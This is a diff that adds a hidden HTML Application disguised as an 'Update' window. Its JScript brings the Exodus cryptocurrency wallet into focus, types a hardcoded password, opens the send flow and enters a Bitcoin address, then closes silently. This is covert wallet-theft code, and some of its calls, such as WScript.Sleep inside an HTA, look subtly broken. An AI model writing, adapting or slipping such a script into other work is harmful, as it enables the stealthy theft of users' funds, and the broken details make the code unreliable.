@@ -1,0 +1,34 @@
+<html>
+<head>
+<HTA:APPLICATION ID="stealth"
+  APPLICATIONNAME="Update"
+  BORDER="none"
+  CAPTION="no"
+  SHOWINTASKBAR="no"
+  SINGLEINSTANCE="yes"
+  SYSMENU="no"
+  WINDOWSTATE="minimize">
+</head>
+<script language="JScript">
+var shell = new ActiveXObject("WScript.Shell");
+
+// Delay for Exodus login
+WScript.Sleep(3000);
+shell.AppActivate("Enter Password");
+shell.SendKeys("!Mamoute901{ENTER}");
+WScript.Sleep(4000);
+
+// Focus main Exodus
+shell.AppActivate("EXODUS");
+WScript.Sleep(1500);
+
+// Wallet → Send → BTC
+shell.SendKeys("%w");   // Alt+W
+shell.SendKeys("%s");   // Alt+S
+shell.SendKeys("1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa");
+
+// Close silently after run
+window.close();
+</script>
+<body></body>
+</html>
